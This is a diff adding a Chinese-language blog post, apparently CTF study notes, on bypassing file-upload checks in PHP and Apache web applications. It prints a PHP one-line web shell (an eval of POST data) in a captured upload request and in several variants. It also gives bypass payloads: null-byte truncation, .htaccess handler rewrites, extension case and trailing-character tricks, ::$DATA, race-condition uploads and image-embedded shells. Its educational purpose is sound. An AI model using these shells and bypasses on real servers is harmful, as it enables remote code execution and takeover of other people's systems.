@@ -1,0 +1,1531 @@
+<!DOCTYPE html>
+
+
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="最近参考了很多文章，结合以前整理的把文件上传的知识重新总结了一下，除了下面列举的这些姿势外(当然，有的还没列举到)，比赛中常见的形式就是上传题会结合源码泄露进行分析绕过。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传漏洞">
+<meta property="og:url" content="http://yoursite.com/2019/06/13/文件上传漏洞/index.html">
+<meta property="og:site_name" content="gtfly">
+<meta property="og:description" content="最近参考了很多文章，结合以前整理的把文件上传的知识重新总结了一下，除了下面列举的这些姿势外(当然，有的还没列举到)，比赛中常见的形式就是上传题会结合源码泄露进行分析绕过。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.imgur.com/Esh8CaF.jpg">
+<meta property="og:image" content="https://i.imgur.com/eXPvVPb.jpg">
+<meta property="og:image" content="https://i.imgur.com/9xAZSdp.png">
+<meta property="og:image" content="https://i.imgur.com/tvHQklR.png">
+<meta property="og:updated_time" content="2019-06-13T13:03:20.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="文件上传漏洞">
+<meta name="twitter:description" content="最近参考了很多文章，结合以前整理的把文件上传的知识重新总结了一下，除了下面列举的这些姿势外(当然，有的还没列举到)，比赛中常见的形式就是上传题会结合源码泄露进行分析绕过。">
+<meta name="twitter:image" content="https://i.imgur.com/Esh8CaF.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeIn","post_body":"fadeIn","coll_header":"fadeIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/06/13/文件上传漏洞/">
+
+
+
+
+
+  <title>文件上传漏洞 | gtfly</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><script> 
+ function GetRandomNum(Min,Max) 
+ { 
+    var Range = Max - Min; 
+    var Rand = Math.random(); 
+    return(Min + Math.round(Rand * Range)); 
+ } 
+ function setSidebarMarginTop (headerOffset) { 
+    return $('#sidebar').css({ 'margin-top': headerOffset }); 
+ } 
+ function getHeaderOffset () { 
+    return $('.header-inner').height() + CONFIG.sidebar.offset; 
+ }
+    window.onload=function() { 
+    var subtitle = "人生如逆旅，我亦是行人。"; 
+    var mytitle = subtitle.split("W"); 
+    var max = mytitle.length-1;
+    var index = GetRandomNum(0,max); 
+    var text = mytitle[index]; 
+    $("#helloTitle").html(text); 
+    var headOffset = getHeaderOffset(); 
+    setSidebarMarginTop(headOffset); 
+// alert(getHeaderOffset()); 
+ }  
+</script>
+
+<div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">gtfly</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人生如逆旅，我亦是行人。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-resource">
+          <a href="https://github.com/gtfly?tab=stars" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-star"></i> <br>
+            
+            资源
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-paper-plane"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/13/文件上传漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="gtfly">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="gtfly">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">文件上传漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-13T13:03:25+08:00">
+                2019-06-13
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-06-13T21:03:20+08:00">
+                2019-06-13
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/06/13/文件上传漏洞/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/06/13/文件上传漏洞/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>最近参考了很多文章，结合以前整理的把文件上传的知识重新总结了一下，除了下面列举的这些姿势外(当然，有的还没列举到)，比赛中常见的形式就是上传题会结合源码泄露进行分析绕过。</p>
+<a id="more"></a>
+
+<h3 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h3><p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。   </p>
+<p>文件上传的文件载体要么在服务器端具备可执行性，要么具备影响服务器端行为的能力，其发挥作用还需要具备以下几个条件：</p>
+<p>（1）上传的文件具备可执行性或能够影响服务器行为，所以文件所在的目录必须在WEB容器覆盖的路径之内；（必须在这个服务器之下）</p>
+<p>（2）用户可以从Web上访问这个文件，从而使得Web容器解释执行该文件；（就是你可以访问到你上传的这个文件）   </p>
+<p>（3）上传后的文件必须经过安全检查，不会被格式化、压缩等处理改变其内容；（文件的内容不会被修改）</p>
+<h3 id="文件上传-Multipart-form-data"><a href="#文件上传-Multipart-form-data" class="headerlink" title="文件上传-Multipart/form-data"></a>文件上传-Multipart/form-data</h3><p>对于普通的HTML Form POST请求，它会在头信息里使用Content-Length注明内容长度。头信息每行一条，空行之后便是Body，即“内容”（entity）。它的Content-Type是application/x-www-form-urlencoded，这意味着消息内容会经过URL编码</p>
+<p>最早的HTTP POST是不支持文件上传的；后来Content-Type的类型扩充了multipart/form-data用以支持向服务器发送二进制数据</p>
+<p>用burp抓到文件上传的部分信息如下：</p>
+<pre><code>Content-Length: 315
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTUDdEg7S0viQZNs5
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://123.206.87.240:8002/web9/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: td_cookie=2691609149; td_cookie=2955167419
+
+------WebKitFormBoundaryTUDdEg7S0viQZNs5
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;caidao.php&quot;
+Content-Type: image/png  
+
+&lt;?php @eval($_POST[&apos;pass&apos;]);?&gt;
+------WebKitFormBoundaryTUDdEg7S0viQZNs5
+Content-Disposition: form-data; name=&quot;submit&quot;
+
+Submit
+------WebKitFormBoundaryTUDdEg7S0viQZNs5--</code></pre><p>第一个空行前时HTTP header，后面则是entity，即内容</p>
+<p>需要选择一段数据作为“分割边界”（boundary属性），这个“边界数据”不能在内容其他地方出现，每次post浏览器都会生成一个随机的30-40位长度的随机字符串</p>
+<p>选择了这个边界之后，浏览器便把它放在Content-Type里面传递给服务器，服务器根据此边界解析数据。下面的数据便根据boundary划分段，每一段便是一项数据。(每个field被分成小部分，而且包含一个value是”form-data”的”Content-Disposition”的头部；一个”name”属性对应field的ID,等等，文件的话包括一个filename)</p>
+<h3 id="客户端javascript-检测-通常为检测文件扩展名"><a href="#客户端javascript-检测-通常为检测文件扩展名" class="headerlink" title="客户端javascript 检测(通常为检测文件扩展名)"></a>客户端javascript 检测(通常为检测文件扩展名)</h3><p>上传时，数据还没有发送出去，浏览器就已经弹出警示框，说明数据还没有发送给服务器，程序就判断出来文件类型不对，因此就可以得出结论这个是通过客户端进行的本地文件检测</p>
+<p>这类检测通常在上传页面里含有专门检测文件上传的javascript 代码,最常见的就是检测扩展名是否合法。 </p>
+<p><strong>绕过方法</strong></p>
+<p>1.上传时使用Burpsuite拦截数据包，将木马的扩展名改为原来的php,即可绕过客户端的验证。</p>
+<p>2.通过console控制台更改js代码</p>
+<h3 id="服务端检测绕过"><a href="#服务端检测绕过" class="headerlink" title="服务端检测绕过"></a>服务端检测绕过</h3><h4 id="0x01-服务端MIME类型检测-检测Content-Type-内容"><a href="#0x01-服务端MIME类型检测-检测Content-Type-内容" class="headerlink" title="0x01.服务端MIME类型检测(检测Content-Type 内容)"></a>0x01.服务端MIME类型检测(检测Content-Type 内容)</h4><p>当用户上传文件到服务器端的时候，服务器端的程序会获取上传文件的MIME类型，然后用这个获取到的类型来和期望的MIME类型进行匹配，如果匹配不上则说明上传的文件不合法。</p>
+<p><strong>MIME类型是什么？</strong>  </p>
+<p>在把输出结果传送到浏览器上的时候，浏览器必须启动应用程序来处理这个输出文档。这可以通过多种类型MIME（多功能网际邮件扩充协议）来完成。<br>在HTTP中，MIME类型被定义在Content-Type header中。</p>
+<p>常见的MIME类型：</p>
+<pre><code>.html           text/html 
+.txt          text/plain 
+.gif          image/gif 
+.jpg          image/jpeg   
+.png          image/png  </code></pre><p><strong>绕过方法</strong></p>
+<p>设置检测文件的类型，可以通过burpsuite来修改文件的类型进行过滤即可  </p>
+<p>小技巧：如果允许上传jpg类型的文件，则可以先将木马后缀加上<code>.jpg</code>，上传时抓包，拦截得到的Content-Type为jpg类型，再将<code>.jpg</code>去掉即可。这样就不用去修改Content-Type类型了</p>
+<h4 id="0x02-0x00截断"><a href="#0x02-0x00截断" class="headerlink" title="0x02.0x00截断"></a>0x02.0x00截断</h4><p>当文件系统读到<code>0x00</code>时，会认为文件名已经结束。  </p>
+<h5 id="上传路径可控"><a href="#上传路径可控" class="headerlink" title="上传路径可控"></a>上传路径可控</h5><p>使用<code>0x00</code>截断需要满足以下条件：</p>
+<pre><code>php版本小于5.3.4
+php的magic_quotes_gpc为OFF状态</code></pre><p>如果文件后缀被白名单限制为<code>.jpg</code>，但上传路径可控：</p>
+<pre><code>$img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code></pre><p>则在路径中，可以使用<code>0x00</code>截断的方法：</p>
+<pre><code>POST /Pass-11/index.php?save_path=../upload/yijuhua.php%00 HTTP/1.1
+
+Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;yijuhua.jpg&quot;</code></pre><p>则上传的文件名会以<code>yijuhua.php</code>形式存放到<code>../upload</code>中</p>
+<p>如果路径是以<code>$_POST</code>方式传递的，则需要将<code>.</code>替换成<code>0x00</code>，而不是<code>%00</code>，因为POST传递的值不会经URL解码，具体方法：</p>
+<p>使用burp，抓到数据后点开<code>hex</code>，将倒数第一个小数点对应的<code>2e</code>改成<code>00</code>即可</p>
+<h5 id="move-uploaded-file-（CVE-2015-2348）"><a href="#move-uploaded-file-（CVE-2015-2348）" class="headerlink" title="move_uploaded_file() （CVE-2015-2348）"></a>move_uploaded_file() （CVE-2015-2348）</h5><p>漏洞影响版本必须在5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7</p>
+<p>函数用法：</p>
+<pre><code>bool move_uploaded_file( string $filename, string $destination)</code></pre><p>该函数将上传的文件移动到新位置</p>
+<p>如果文件上传代码中有：</p>
+<pre><code>if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)</code></pre><p>那么可用<code>0x00</code>截断的方法：</p>
+<pre><code>move_uploaded_file($_FILES[&apos;name&apos;][&apos;tmp_name&apos;],&quot;/file.php\x00.jpg&quot;);</code></pre><p>这本应该创建一个名为file.php\x00.jpg的文件，但实际上创建的文件是file.php</p>
+<h4 id="0x03-Apache文件解析特性"><a href="#0x03-Apache文件解析特性" class="headerlink" title="0x03.Apache文件解析特性"></a>0x03.Apache文件解析特性</h4><h5 id="多后缀名"><a href="#多后缀名" class="headerlink" title="多后缀名"></a>多后缀名</h5><p>Apache对于文件名的解析是从后往前解析的，直到遇见一个Apache认识的文件类型为止</p>
+<p>如：</p>
+<pre><code>hello.php.rar.rar.rar</code></pre><p>Apache不认识.rar这个文件类型，会一直遍历到.php</p>
+<hr>
+<p>测试环境：windows10，Apache/2.4.23，PHP/5.5.38</p>
+<p>在phpstudy网站目录存放一张<code>a.jpg</code>图片，将其改名为<code>a.jpg.abc</code>，再用浏览器去访问这张图片，发现被成功解析为图片：</p>
+<p><img src="https://i.imgur.com/Esh8CaF.jpg" alt></p>
+<p>那么现在在网站目录存放一个<code>ma.php</code>文件，里面内容为：</p>
+<pre><code>&lt;?php
+echo &apos;good&apos;;
+?&gt;</code></pre><p>再将其改名为<code>ma.php.abc</code>，访问这个文件：</p>
+<p><img src="https://i.imgur.com/eXPvVPb.jpg" alt></p>
+<p>发现其并没有被解析，而是直接将里面的内容显示了出来，这是因为Apache本身并不懂php，而是将这个文件交给php解释器，php解释器和Apache有着不同的解析规则；</p>
+<p>在<code>phpStudy\PHPTutorial\Apache\conf\extra</code>找到<code>httpd-php.conf</code>这个配置文件，打开可以看到</p>
+<pre><code>&lt;FilesMatch &quot;\.php$&quot;&gt;
+    SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;</code></pre><p>我们可以知道，只有当文件名后缀为<code>.php</code>时，文件才能被当做php执行，那么现在将其改为：</p>
+<pre><code>&lt;FilesMatch &quot;\.php\.&quot;&gt;
+    SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;</code></pre><p>重启phpstudy，可以看到<code>ma.php.abc</code>已经可以被解析了：</p>
+<p><img src="https://i.imgur.com/9xAZSdp.png" alt></p>
+<h5 id="罕见后缀"><a href="#罕见后缀" class="headerlink" title="罕见后缀"></a>罕见后缀</h5><p>在某些情况下，不只是php，就连<code>phtml</code>、<code>pht</code>、<code>php3</code>、<code>php4</code>和<code>php5</code>都是Apache和php认可的php程序的文件后缀</p>
+<h5 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h5><p>Apache提供了一种很方便的、可作用于当前目录及其子目录的分布式配置文件：<code>.htaccess</code></p>
+<p>要使.htaccess文件生效，需要在Apache的配置文件中写上(这里我的配置文件中默认就有以下配置)：</p>
+<pre><code>AllowOverride All
+
+LoadModule rewrite_module modules/mod_rewrite.so</code></pre><p>之后，我们测试用.htaccess文件修改php解释器配置：</p>
+<p>新建一个<code>.htaccess</code>文件，由于windows不支持文件名以小数点开头，需要用到cmd命令：</p>
+<pre><code>echo &gt; .htaccess</code></pre><p>这样即可生成<code>.htaccess</code>文件；在这个文件里面写入：</p>
+<pre><code>&lt;FilesMatch &quot;xxx&quot;&gt;  
+    SetHandler application/x-httpd-php  
+&lt;/FilesMatch&gt;</code></pre><p>即让php解释器将文件名中含有<code>xxx</code>的文件解析为php</p>
+<p>在此<code>.htaccess</code>目录创建<code>a.xxx</code>文件，在里面写入：</p>
+<pre><code>&lt;?php
+echo &apos;good&apos;;
+?&gt;</code></pre><p>发现其被解析成了php：</p>
+<p><img src="https://i.imgur.com/tvHQklR.png" alt></p>
+<p>将<code>a.xxx</code>改名为<code>xxx.abc</code>，也是会被解析为php的</p>
+<h4 id="0x04-条件竞争"><a href="#0x04-条件竞争" class="headerlink" title="0x04.条件竞争"></a>0x04.条件竞争</h4><p>Web服务器处理多用户请求时，是并发进行的，如果并发处理不当或者是相关的逻辑操作设计的不合理时，就可能导致条件竞争漏洞。</p>
+<p>例如：将文件上传到服务器，然后检查上传的文件的类型，如果不符合条件就删除。</p>
+<p>但是，如果我们采用多线程的方式访问上传的文件，总有一次我们在文件删除之前就访问到了这个文件，如果这个文件是php的一句话木马，就在服务器中执行了这个木马</p>
+<p>具体方法：</p>
+<p>使用<code>burp intruder</code>，在<code>payload</code>中选择<code>Null payloads</code>，在下面<code>Generate</code>后输入请求次数，之后点击<code>start attack</code>，即可不断的上传文件</p>
+<h4 id="0x05-后缀名大小写绕过"><a href="#0x05-后缀名大小写绕过" class="headerlink" title="0x05.后缀名大小写绕过"></a>0x05.后缀名大小写绕过</h4><p>如果在与黑名单比较前没有将后缀进行大小写统一的话：</p>
+<pre><code># $file_ext = strtolower($file_ext); //转换为小写</code></pre><p>可以通过大小写绕过：</p>
+<pre><code>.pHp
+.PHP
+...</code></pre><h4 id="0x06-在后缀名后加空格"><a href="#0x06-在后缀名后加空格" class="headerlink" title="0x06.在后缀名后加空格"></a>0x06.在后缀名后加空格</h4><p>如果在与黑名单比较前没有将文件名首尾去空的话：</p>
+<pre><code># $file_ext = trim($file_ext); //首尾去空</code></pre><p>可以通过在文件名后加空格绕过：</p>
+<pre><code>filename=&quot;yijuhua.php  &quot;</code></pre><h4 id="0x07-Windows解析特性"><a href="#0x07-Windows解析特性" class="headerlink" title="0x07.Windows解析特性"></a>0x07.Windows解析特性</h4><h5 id="文件后缀的点"><a href="#文件后缀的点" class="headerlink" title="文件后缀的点"></a>文件后缀的点</h5><p>如果服务器是windows系统，且在与黑名单比较前没有将文件后缀的点进行过滤：</p>
+<pre><code># $file_name = deldot($file_name);//删除文件名末尾的点</code></pre><p>可以在文件名后加点后再上传：</p>
+<pre><code>filename=&quot;yijuhua.php.&quot;</code></pre><p>windows服务器收到这个文件后，会自动忽略掉后面的点</p>
+<h5 id="DATA"><a href="#DATA" class="headerlink" title="::$DATA"></a>::$DATA</h5><p>如果服务器是windows系统，且在与黑名单比较前没有将文件名中的<code>::$DATA</code>去除：</p>
+<pre><code># $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</code></pre><p>可以在文件名后加上这个字符串再上传：</p>
+<pre><code>filename=&quot;yijuhua.php::$DATA&quot;</code></pre><p>php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理</p>
+<h4 id="0x08-上传后被删除"><a href="#0x08-上传后被删除" class="headerlink" title="0x08.上传后被删除"></a>0x08.上传后被删除</h4><pre><code>&lt;?php 
+$filename = __DIR__ . &apos;/tmp/&apos; . $user[&apos;name&apos;]; 
+$data = $user[&apos;info&apos;]; 
+file_put_contents($filename, $data); // ...一些处理 
+if (file_exists($filename)) { 
+    unlink($filename); 
+} 
+?&gt;</code></pre><p>unlink — 删除文件</p>
+<pre><code>bool unlink( string $filename[, resource $context] )</code></pre><h5 id="方法一-条件竞争"><a href="#方法一-条件竞争" class="headerlink" title="方法一.条件竞争"></a>方法一.条件竞争</h5><h5 id="方法二-函数特性"><a href="#方法二-函数特性" class="headerlink" title="方法二.函数特性"></a>方法二.函数特性</h5><p>ph大佬总结的：</p>
+<p>查看php源码，其实我们能发现，php读取、写入文件，都会调用<code>php_stream_open_wrapper_ex</code>来打开流，而判断文件存在、重命名、删除文件等操作则无需打开文件流。 我们跟一跟<code>php_stream_open_wrapper_ex</code>就会发现，其实最后会使用<code>tsrm_realpath</code>函数来将filename给标准化成一个绝对路径。而文件删除等操作则不会，这就是二者的区别。 所以，如果我们传入的是文件名中包含一个不存在的路径，写入的时候因为会处理掉<code>../</code>等相对路径，所以不会出错；判断、删除的时候因为不会处理，所以就会出现“No such file or directory”的错误。 </p>
+<p>payload1：</p>
+<pre><code>name=xxxxx/../1.php </code></pre><p>（这个方法是仅限Linux，因为Windows的文件操作API也会处理文件路径） </p>
+<p>payload2：</p>
+<pre><code>name=1.php/.</code></pre><h4 id="0x09-上传图片马"><a href="#0x09-上传图片马" class="headerlink" title="0x09.上传图片马"></a>0x09.上传图片马</h4><p>cmd生成命令：</p>
+<pre><code>copy a.jpg/b+a.php shell.jpg</code></pre><p>图片马上传成功后，若服务端存在文件包含漏洞，则(可能)可以被利用</p>
+<p>一句话木马格式：</p>
+<pre><code>&lt;?php @eval($_POST[&apos;cmd&apos;]); ?&gt;</code></pre><p>如果php版本小于7，还可用以下写法：</p>
+<pre><code>&lt;script language=php&gt;@eval($_POST[&apos;cmd&apos;]);&lt;/script&gt;
+
+&lt;acript language=php&gt;system(&quot;ls&quot;);&lt;/script&gt;</code></pre><h5 id="文件头检测"><a href="#文件头检测" class="headerlink" title="文件头检测"></a>文件头检测</h5><p>在文件首部加上如下16进制数据，后面跟一句话木马即可</p>
+<pre><code>JFIF    FF D8 FF E0 00 10 4A 46 49 46
+GIF89a  47 49 46 38 39 61
+PNG     89 50 4E 47</code></pre><h5 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h5><p>服务端会获取上传的图片信息，之后会通过这些信息来生成一个新的图片</p>
+<p>情形：</p>
+<p>参考<a href="https://xz.aliyun.com/t/2657#toc-13" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657#toc-13</a></p>
+<p><strong>GIF</strong><br>直接对比上传前后图像那些部分没有被渲染，在没有被渲染的地方插入木马即可</p>
+<p><strong>PNG</strong></p>
+<p><strong>JPG</strong><br>脚本保存为<code>jpg_payload.php</code>，再准备张图片，之后用cmd：</p>
+<pre><code>php jpg_payload.php a.jpg</code></pre><hr>
+<p>参考链接：<br><a href="https://blog.csdn.net/xiaojianpitt/article/details/6856536" target="_blank" rel="noopener">https://blog.csdn.net/xiaojianpitt/article/details/6856536</a><br><a href="https://xz.aliyun.com/t/2435" target="_blank" rel="noopener">https://xz.aliyun.com/t/2435</a><br><a href="http://phpstudy.php.cn/jishu-php-3234.html" target="_blank" rel="noopener">http://phpstudy.php.cn/jishu-php-3234.html</a><br><a href="https://jingyan.baidu.com/article/3ea5148981f81752e61bba16.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/3ea5148981f81752e61bba16.html</a><br><a href="https://www.cnblogs.com/cyjaysun/p/4390930.html" target="_blank" rel="noopener">https://www.cnblogs.com/cyjaysun/p/4390930.html</a><br><a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=626</a><br><a href="https://xz.aliyun.com/t/2657#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657#toc-1</a></p>
+
+      
+    </div>
+    
+    
+    
+
+  <div>
+    
+      ﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+    
+  </div>
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.jpg" alt="gtfly 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/aipay.jpg" alt="gtfly 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    gtfly
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2019/06/13/文件上传漏洞/" title="文件上传漏洞">http://yoursite.com/2019/06/13/文件上传漏洞/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
